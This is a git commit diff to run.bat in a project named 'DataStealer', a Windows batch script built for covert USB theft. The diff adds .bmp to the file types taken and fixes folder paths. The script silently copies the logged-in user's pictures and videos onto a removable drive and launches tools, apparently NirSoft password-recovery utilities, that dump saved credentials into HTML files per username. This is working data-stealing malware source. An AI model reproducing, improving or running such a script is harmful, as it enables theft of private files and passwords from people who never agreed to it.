6459d56baaf334d15dd1f1848bd4dc090fc938aa
Killcab <lana_wifly_1992@hotmail.com>
2018-02-05 14:11:20 +0000

    Update run.bat

--- DataStealer/data/run.bat
+++ DataStealer/data/run.bat
@@ -4,7 +4,7 @@ REM ###############################################################
 REM ######################### OPTIONS #############################
 REM ###############################################################
 
-set formats=*.jpg *.png *.mp4 *.3gp *.avi
+set formats=*.jpg *.png *.mp4 *.3gp *.avi *.bmp
 
 set stealfiles=true
 set sizemax=50000
@@ -23,7 +23,7 @@ set /a sizemax=%sizemax%*1024
 set /a sizemin=%sizemin%*1024
 
 IF %stealfiles%==true (
-	MKDIR capt\%USERNAME%
+	MKDIR data\capt\%USERNAME%
 	FOR %%# IN (%drives%) DO (IF EXIST "%%#:\data" (
 		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Pictures\ %%#:\data\capt\%USERNAME%
 		ROBOCOPY /W:0 /NJH /S %formats% /NJS /MAX:%sizemax% /MIN:%sizemin% %userprofile%\Videos\ %%#:\data\capt\%USERNAME%
@@ -34,9 +34,9 @@ IF %stealfiles%==true (
 )
 
 IF %nirsoft%==true (
-	MKDIR pss\%USERNAME%
+	MKDIR data\pss\%USERNAME%
 	FOR %%I IN (%soft%) DO (
-		start soft/%%I.exe /shtml "pss\%USERNAME%\%%I.html"
+		start data\soft\%%I.exe /shtml "data\pss\%USERNAME%\%%I.html"
 	)
 )
 
